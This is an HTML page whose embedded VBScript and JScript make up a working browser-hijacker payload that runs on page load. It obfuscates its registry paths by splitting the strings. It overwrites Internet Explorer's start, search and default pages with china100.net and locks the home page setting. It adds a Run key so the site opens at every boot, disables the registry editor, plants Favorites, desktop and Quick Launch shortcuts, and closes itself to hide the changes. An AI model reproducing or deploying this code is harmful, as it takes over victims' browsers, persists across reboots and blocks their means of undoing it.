   <html>
   <object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script LANGUAGE="VBscript">
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ma"&"in\St"&"ar"&"t Pa"&"ge", "http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ma"&"in\St"&"ar"&"t Pa"&"ge", "http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ma"&"in\Se"&"arch Pa"&"ge", "http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ma"&"in\def"&"ault_p"&"age_ur"&"l", "http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Typ"&"edURLs\ur"&"l1","http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Typ"&"edUR"&"Ls\ur"&"l2","http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ty"&"pedU"&"RL"&"s\u"&"rl3","http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ma"&"in\Fi"&"rst Ho"&"me Pa"&"ge","http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ma"&"in\Fir"&"st H"&"om"&"e Pa"&"ge","http://www.china100.net"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Policies\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Co"&"ntr"&"ol Pa"&"ne"&"l\H"&"ome"&"Pa"&"ge","1","REG_DWORD"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\Wi"&"ndo"&"ws\C"&"urr"&"entVe"&"rsi"&"on\R"&"un\IE"&"XPL"&"ORE.EXE", "IEXPLORE.EXE http://www.china100.net"
   wsh.RegWrite "HK"&"C"&"U\So"&"ft"&"wa"&"re\Mic"&"ro"&"sof"&"t\Wi"&"ndo"&"ws\Cur"&"ren"&"tVe"&"rs"&"ion\Pol"&"ici"&"es\Sy"&"s"&"te"&"m\Dis"&"abl"&"eRe"&"gis"&"tr"&"yToo"&"ls","1","REG_DWORD"
   wsh.RegWrite "H"&"KC"&"U\So"&"ftw"&"are\Mi"&"cro"&"sof"&"t\In"&"ter"&"ne"&"t E"&"xp"&"lor"&"er\Ma"&"in\Win"&"dow Tit"&"le", "--»¶Ó·ÃÎÊ www.china100.net--"
   window.close
   </script>
   <script LANGUAGE="VBscript">
   on error resume next
   Call LongFei_AddFavorites("¡¾ÒôÀÖÓ°ÊÓ¡¿","http://www.china100.net")
   Call LongFei_AddFavorites("¡¾ÉÏÍòÊ×ÒôÀÖ¡¿","http://www.china100.net")

   on error resume next
   Call LongFei_AddDesktop("ÒôÀÖÓ°ÊÓ","http://www.china100.net")
   Call LongFei_AddDesktop("ÉÏÍòÊ×ÒôÀÖ","http://www.china100.net")

   on error resume next
   Call LongFei_AddQuickLaunch("[ÓéÀÖÃ÷ÐÇÍø]","http://www.china100.net")
   Call LongFei_AddQuickLaunch("[ÉÏÍòÊ×ÒôÀÖ]","http://www.china100.net")

   Function LongFei_AddFavorites(N, U)
       on error resume next
       Set S = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
       Set Sl = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/Á´½Ó/" + N +".URL")
       Sl.TargetPath = U
       Sl.Save()
   End Function

   Function LongFei_AddDesktop(N, U)
       on error resume next
       Set S = wsh.CreateShortcut(wsh.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function

   </script>
   <script language="Jscript">
   function closeit() {
   setTimeout("self.close()",5)
   }
   closeit()
   </script>
   </html>
